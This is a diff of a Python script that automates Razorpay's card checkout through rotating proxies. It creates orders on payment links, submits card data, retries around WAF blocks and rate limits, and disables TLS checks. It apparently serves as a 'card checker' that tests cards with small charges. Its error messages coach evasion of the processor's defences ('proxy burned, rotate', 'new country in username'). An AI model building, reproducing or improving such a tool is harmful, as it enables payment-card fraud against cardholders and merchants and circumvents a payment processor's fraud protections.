@@ -9,7 +9,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 requests.packages.urllib3.disable_warnings()
 
 # ============================================================
-# ============== FORCE IPv4 (PROXY COMPATIBILITY) ============
+# ============== FORCE IPv4 ===================================
 # ============================================================
 _original_getaddrinfo = socket.getaddrinfo
 
@@ -44,11 +44,11 @@ def health():
 def create_session_with_retries():
     session = requests.Session()
     retry_strategy = Retry(
-        total=3,
-        connect=3,
-        read=3,
-        backoff_factor=1.5,
-        status_forcelist=[429, 500, 502, 503, 504],
+        total=2,               # Rotating proxies pe zyada retry se IP change ho jata hai, isliye 2
+        connect=2,
+        read=2,
+        backoff_factor=1.0,
+        status_forcelist=[500, 502, 503, 504],   # 403/429 NOT retried
         allowed_methods=["GET", "POST"],
         raise_on_status=False,
     )
@@ -98,10 +98,12 @@ def parse_proxy(p):
             scheme = s[0].lower()
             p = s[1]
     body = p
+    # Format: user:pass@host:port
     if '@' in body:
         auth, host = body.rsplit('@', 1)
-        user, _, pwd = auth.partition(':')
-        body = f"{user}:{pwd}@{host}"
+        # auth = "user:pass"
+        body = f"{auth}@{host}"
+    # Format: ip:port:user:pass  (4 colons after removing @)
     elif body.count(':') == 3:
         ip, port, user, pwd = body.split(':')
         body = f"{user}:{pwd}@{ip}:{port}"
@@ -130,27 +132,6 @@ def check_site(site_url, proxy=None, cc=None):
     if proxy:
         session.proxies.update(proxy)
 
-    # ===== PROXY HEALTH PROBE (fail fast, 2-3s) =====
-    try:
-        probe = session.get("https://api.ipify.org?format=json", verify=False, timeout=8)
-        if probe.status_code != 200:
-            return "PROXY_DEAD: probe non-200"
-    except requests.exceptions.ConnectionError as e:
-        return f"PROXY_DEAD: {str(e)[:60]}"
-    except requests.exceptions.Timeout:
-        return "PROXY_DEAD: timeout"
-    except Exception as e:
-        return f"PROXY_DEAD: {str(e)[:60]}"
-
-    # ===== BUILD EXTRACTION =====
-    try:
-        js = session.get("https://checkout.razorpay.com/v1/checkout.js", verify=False, timeout=15).text
-        BUILD = (m.group(1) if (m := re.search(r'g="([a-f0-9]{40})"', js)) else "afa3662e035e66c495f2ddc21c6f030530870f53")
-        BUILD_V1 = (m.group(1) if (m := re.search(r'build_v1:"([a-f0-9]{40})"', js)) else "da4ee3f43a28ad81dba8ed06daf899a4520c691f")
-    except:
-        BUILD = "afa3662e035e66c495f2ddc21c6f030530870f53"
-        BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"
-
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
 
     # ============================================================
@@ -173,30 +154,48 @@ def check_site(site_url, proxy=None, cc=None):
         "Connection": "keep-alive",
     }
 
-    # ===== PAGE LOAD =====
+    # ============================================================
+    # ===== PAGE LOAD = PROXY HEALTH CHECK (rotating proxies ke liye) =====
+    # ============================================================
     try:
-        r = session.get(site_url, verify=False, timeout=30, headers=page_headers)
+        r = session.get(site_url, verify=False, timeout=30, headers=page_headers, allow_redirects=True)
+    except requests.exceptions.ProxyError as e:
+        return f"PROXY_DEAD: proxy refused connection ({str(e)[:80]})"
+    except requests.exceptions.SSLError as e:
+        return f"PROXY_DEAD: SSL error through proxy ({str(e)[:80]})"
+    except requests.exceptions.ConnectTimeout:
+        return "PROXY_DEAD: connect timeout (proxy unreachable)"
+    except requests.exceptions.ReadTimeout:
+        return "PROXY_DEAD: read timeout (proxy slow/dead)"
     except requests.exceptions.ConnectionError as e:
-        return f"NETWORK_ERROR: page load ({str(e)[:60]})"
-    except requests.exceptions.Timeout:
-        return "NETWORK_ERROR: page load timeout"
+        return f"PROXY_DEAD: {str(e)[:80]}"
     except Exception as e:
-        return f"NETWORK_ERROR: page load ({str(e)[:60]})"
+        return f"PROXY_DEAD: {str(e)[:80]}"
 
-    # ===== 403 WAF DETECTION =====
+    # ============================================================
+    # ===== HTTP RESPONSE = PROXY IS ALIVE =======================
+    # ============================================================
     if r.status_code == 403:
-        return "WAF_403: Proxy blocked by Razorpay (use residential Indian proxy)"
+        return "WAF_403: Proxy blocked by Razorpay. Try port 443 or new country in username"
     if r.status_code == 429:
-        return "RATE_LIMITED: Razorpay throttled this proxy (rotate proxy)"
+        return "RATE_LIMITED: Proxy throttled. Wait 60s or rotate"
+    if r.status_code >= 500:
+        return f"UPSTREAM_{r.status_code}: Razorpay server error"
     if r.status_code != 200:
-        return f"HTTP_{r.status_code}: page load failed"
+        return f"HTTP_{r.status_code}: Razorpay page failed"
 
+    # ===== PARSE PAGE DATA =====
     m = re.search(r'var data = ({.*?});', r.text, re.DOTALL)
     if not m:
-        return "PAGE_DATA_NOT_FOUND: Razorpay page structure changed or proxy redirected"
-    init_data = json.loads(m.group(1))
+        return "PAGE_DATA_NOT_FOUND: Razorpay ne page structure badal diya ya proxy ne redirect kiya"
+    try:
+        init_data = json.loads(m.group(1))
+    except Exception:
+        return "PAGE_PARSE_ERROR: JSON parse fail"
+
     if "error_code" in init_data:
         return str(init_data.get("message", "page error"))[:200]
+
     kyid = init_data["key_id"]
     plink = init_data["payment_link"]["id"]
     ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
@@ -209,6 +208,15 @@ def check_site(site_url, proxy=None, cc=None):
         amo = 100
     if amo < 1:
         amo = 100
+
+    # ===== BUILD EXTRACTION =====
+    try:
+        js = session.get("https://checkout.razorpay.com/v1/checkout.js", verify=False, timeout=15).text
+        BUILD = (m.group(1) if (m := re.search(r'g="([a-f0-9]{40})"', js)) else "afa3662e035e66c495f2ddc21c6f030530870f53")
+        BUILD_V1 = (m.group(1) if (m := re.search(r'build_v1:"([a-f0-9]{40})"', js)) else "da4ee3f43a28ad81dba8ed06daf899a4520c691f")
+    except:
+        BUILD = "afa3662e035e66c495f2ddc21c6f030530870f53"
+        BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"
 
     session.cookies.set("_rzp_unified_session_id", rzp_unified_session_id, domain=".razorpay.com")
 
@@ -238,7 +246,7 @@ def check_site(site_url, proxy=None, cc=None):
     if resp_o.status_code == 403:
         return "WAF_403: Order create blocked (proxy burned, rotate)"
     if resp_o.status_code == 429:
-        return "RATE_LIMITED: Order create throttled (rotate proxy)"
+        return "RATE_LIMITED: Order create throttled"
 
     try:
         od = json.loads(resp_o.text)
@@ -290,7 +298,6 @@ def check_site(site_url, proxy=None, cc=None):
         "User-Agent": ua, "x-session-token": sessid,
     }
 
-    # ===== PREFERENCES (fire and forget) =====
     try:
         session.post(
             "https://api.razorpay.com/v2/standard_checkout/preferences",
@@ -322,7 +329,6 @@ def check_site(site_url, proxy=None, cc=None):
         "order_id": order_id, "method": "card", "checkout_id": checkout_id,
     }
 
-    # ===== CHECKOUT ORDER =====
     try:
         r_co = session.post("https://api.razorpay.com/v1/standard_checkout/checkout/order", params=params_co, headers=h_co, data=data_co, verify=False, timeout=30)
     except requests.exceptions.ConnectionError as e:
@@ -352,7 +358,6 @@ def check_site(site_url, proxy=None, cc=None):
         "forex_charges": {"amount": amo, "currency": "INR", "filters": {"method": "card"}}
     }
 
-    # ===== CB FLOWS (fire and forget) =====
     try:
         session.post(f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={klh_url}", headers=h_cb, json=payload_cb, verify=False, timeout=30)
     except Exception:
@@ -400,7 +405,7 @@ def check_site(site_url, proxy=None, cc=None):
     if r_final.status_code == 403:
         return "WAF_403: Charge blocked (proxy burned, rotate)"
     if r_final.status_code == 429:
-        return "RATE_LIMITED: Charge throttled (rotate proxy)"
+        return "RATE_LIMITED: Charge throttled"
 
     txt = r_final.text
 
